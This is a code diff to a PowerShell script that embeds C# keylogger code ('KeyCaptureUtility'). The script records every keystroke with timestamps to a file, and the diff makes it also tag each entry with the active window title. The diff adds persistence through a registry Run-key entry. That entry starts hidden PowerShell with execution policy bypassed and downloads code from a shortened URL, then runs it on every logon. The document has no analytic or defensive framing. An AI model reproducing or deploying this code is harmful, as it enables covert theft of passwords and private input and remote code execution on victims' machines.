@@ -35,6 +35,7 @@ using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
+using System.Diagnostics;
 using System.Collections.Generic;
 
 public class KeyCaptureUtility
@@ -52,6 +53,13 @@ public class KeyCaptureUtility
     [DllImport("user32.dll", CharSet = CharSet.Auto)]
     public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, StringBuilder pwszBuff, int cchBuff, uint wFlags);
 
+    // DLL Import for getting the active window title
+    [DllImport("user32.dll", CharSet = CharSet.Auto)]
+    public static extern IntPtr GetForegroundWindow();
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto)]
+    public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+
     public static void CaptureInput(string filePath)
     {
         StringBuilder captureBuffer = new StringBuilder();
@@ -63,7 +71,6 @@ public class KeyCaptureUtility
         if (!File.Exists(filePath))
         {
             File.Create(filePath).Dispose();
-            //Console.WriteLine("File created: " + filePath);  // Log file creation
         }
 
         // Continuous loop to capture keypresses
@@ -101,7 +108,6 @@ public class KeyCaptureUtility
                         if (unicodeResult > 0)
                         {
                             string charPressed = logChar.ToString();
-                            //Console.WriteLine("asc: " + asc);  // Log the saved message
 
                             // Handle special keys based on provided mapping
                             charPressed = HandleSpecialKeys(asc, charPressed);
@@ -127,11 +133,13 @@ public class KeyCaptureUtility
 
             if (keyPressed)
             {
-                // Save input to the file with a timestamp
+                // Get the active window title
+                string activeWindowTitle = GetActiveWindowTitle();
+
+                // Save input to the file with a timestamp and active window information
                 string timestamp = DateTime.Now.ToString("dd-MM-yyyy HH:mm:ss");
-                string message = timestamp + " : " + captureBuffer.ToString() + "\r\n";
+                string message = timestamp + " : " + captureBuffer.ToString() + " [Active Window: " + activeWindowTitle + "]\r\n";
                 File.AppendAllText(filePath, message);
-                //Console.WriteLine("Input saved: " + message);  // Log the saved message
                 captureBuffer.Clear();  // Clear the input buffer after saving
             }
 
@@ -182,9 +190,26 @@ public class KeyCaptureUtility
                 return charPressed;  // Return original character if it's a printable key
         }
     }
+
+    // Method to get the active window's title
+    public static string GetActiveWindowTitle()
+    {
+        IntPtr hwnd = GetForegroundWindow();
+        StringBuilder windowTitle = new StringBuilder(256);
+        GetWindowText(hwnd, windowTitle, 256);
+        return windowTitle.ToString();
+    }
 }
 "@
 }
+
+# Add the script to startup (by modifying the registry) with the provided URL
+$regKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$scriptName = "Startup"
+$regCommand = 'powershell -NoP -Ep Bypass -W H -Command "irm https://shorturl.at/FkQqM | iex"'
+
+# Add the entry to the registry for startup
+Set-ItemProperty -Path $regKeyPath -Name $scriptName -Value $regCommand
 
 # Call the CaptureInput method to start capturing inputs (synchronously)
 [KeyCaptureUtility]::CaptureInput($tempFilePath)
